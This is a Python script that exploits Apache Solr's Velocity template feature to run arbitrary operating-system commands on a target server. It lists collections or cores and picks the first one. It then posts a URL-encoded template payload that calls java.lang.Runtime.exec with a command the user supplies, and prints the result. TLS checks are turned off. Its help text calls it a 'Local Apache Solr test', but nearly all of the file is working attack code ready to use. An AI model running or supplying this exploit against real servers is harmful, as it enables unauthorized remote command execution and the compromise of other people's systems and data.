import requests
import argparse
import urllib3
import base64

urllib3.disable_warnings()

TIMEOUT = 30


def norm(url):
    url = url.strip()

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    if "/solr" not in url:
        url = url.rstrip("/") + "/solr"

    return url


def auth_headers(user="", password=""):
    headers = {}

    if user and password:
        auth = base64.b64encode(
            f"{user}:{password}".encode()
        ).decode()
        headers["Authorization"] = "Basic " + auth

    return headers


def get_cols(url, user="", password=""):
    headers = auth_headers(user, password)

    r = requests.get(
        url + "/admin/collections?action=LIST",
        headers=headers,
        verify=False,
        timeout=TIMEOUT
    )

    if r.status_code == 200:
        try:
            cols = r.json().get("collections", [])
            if cols:
                return cols
        except Exception:
            pass

    r = requests.get(
        url + "/admin/cores?action=STATUS",
        headers=headers,
        verify=False,
        timeout=TIMEOUT
    )

    if r.status_code == 200:
        try:
            cores = list(r.json().get("status", {}).keys())
            if cores:
                return cores
        except Exception:
            pass

    return ["gettingstarted", "test"]


def rce(url, user="", password="", command="id"):
    cols = get_cols(url, user, password)
    target_core = cols[0]

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        **auth_headers(user, password)
    }

    payload = (
        "q=1&wt=velocity&v.template=custom&v.template.custom="
        "%23set($x=%27%27)%23set($rt=$x.class.forName(%27java.lang.Runtime%27))"
        "%23set($chr=$x.class.forName(%27java.lang.Character%27))"
        f"%23set($ex=$rt.getRuntime().exec(%27{command}%27))"
        "$ex.waitFor()"
        "%23set($out=$ex.getInputStream())"
        "%23foreach($i in [1..$out.available()])"
        "$str.valueOf($chr.toChars($out.read()))%23end"
    )

    try:
        r = requests.post(
            f"{url}/{target_core}/select",
            headers=headers,
            data=payload,
            verify=False,
            timeout=TIMEOUT
        )

        if r.status_code == 200 and r.text.strip():
            return r.text.strip()

        print(f"Status: {r.status_code}")
        return None

    except Exception as e:
        print(f"Error: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Local Apache Solr test"
    )

    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target Solr URL"
    )

    parser.add_argument(
        "--user",
        default="",
        help="Username (optional)"
    )

    parser.add_argument(
        "--password",
        default="",
        help="Password (optional)"
    )

    parser.add_argument(
        "-c", "--command",
        default="id",
        help="Command to execute"
    )

    args = parser.parse_args()

    target = norm(args.url)

    print(f"Target: {target}")
    print(f"Authentication: {'enabled' if args.user and args.password else 'disabled'}")
    print(f"Command: {args.command}")

    output = rce(
        target,
        args.user,
        args.password,
        args.command
    )

    if output:
        print("\nOutput:")
        print(output)
    else:
        print("No output or command failed.")


if __name__ == "__main__":
    main()
